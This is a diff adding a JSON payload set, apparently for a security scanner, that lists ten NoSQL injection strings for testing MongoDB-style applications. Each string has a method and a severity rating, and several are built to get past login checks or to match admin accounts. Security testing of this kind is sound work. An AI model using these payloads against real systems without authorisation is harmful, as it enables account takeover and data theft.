@@ -1,0 +1,16 @@
+{
+  "name": "NoSQL Injection",
+  "description": "Payloads for testing NoSQL injection (MongoDB etc.)",
+  "payloads": [
+    {"id": "nosql-01", "value": "{\"$gt\": \"\"}", "method": "replace", "severity": "critical"},
+    {"id": "nosql-02", "value": "{\"$ne\": null}", "method": "replace", "severity": "critical"},
+    {"id": "nosql-03", "value": "{\"$where\": \"1==1\"}", "method": "replace", "severity": "critical"},
+    {"id": "nosql-04", "value": "{\"$regex\": \".*\"}", "method": "replace", "severity": "high"},
+    {"id": "nosql-05", "value": "{\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}", "method": "replace", "severity": "critical"},
+    {"id": "nosql-06", "value": "{\"$or\": [{\"username\": \"admin\"}, {\"password\": {\"$regex\": \".*\"}}]}", "method": "replace", "severity": "high"},
+    {"id": "nosql-07", "value": "'; return true; var foo='", "method": "append", "severity": "high"},
+    {"id": "nosql-08", "value": "{\"$exists\": true}", "method": "replace", "severity": "medium"},
+    {"id": "nosql-09", "value": "{\"$in\": [\"admin\", \"root\", \"superuser\"]}", "method": "replace", "severity": "high"},
+    {"id": "nosql-10", "value": "\" || \"1\"==\"1", "method": "append", "severity": "high"}
+  ]
+}
